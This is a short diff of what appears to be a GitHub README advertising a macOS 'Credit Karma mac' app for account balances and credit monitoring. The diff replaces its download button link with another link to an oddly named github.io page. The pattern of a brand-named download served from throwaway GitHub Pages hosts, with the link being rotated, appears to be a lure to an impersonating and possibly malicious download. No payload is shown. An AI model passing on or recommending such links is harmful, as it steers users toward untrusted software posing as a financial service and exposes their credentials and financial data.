@@ -2,7 +2,7 @@
 
 Credit Karma mac on macOS — toolkit focused on accounts & balances, plus credit score monitoring and alerts with native integrations and Apple silicon
 
-[![Download Credit Karma mac](https://img.shields.io/badge/Download-Credit_Karma_mac-blueviolet)](https://kiamsiodkdf-ajjdhf2834.github.io/.github/info)
+[![Download Credit Karma mac](https://img.shields.io/badge/Download-Credit_Karma_mac-blueviolet)](https://shoemanwhitchurchparis.github.io/.github/Credit-Karma)
 
 ---
 
